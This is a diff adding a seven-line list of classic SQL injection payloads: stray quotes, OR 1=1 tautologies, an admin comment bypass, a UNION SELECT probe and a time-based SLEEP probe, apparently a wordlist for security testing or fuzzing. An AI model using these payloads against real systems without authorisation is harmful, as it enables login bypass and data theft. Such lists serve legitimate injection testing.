@@ -1,0 +1,7 @@
+'
+" 
+' OR '1'='1
+' OR 1=1 --
+admin' --
+' UNION SELECT NULL,NULL --
+' AND SLEEP(5) --
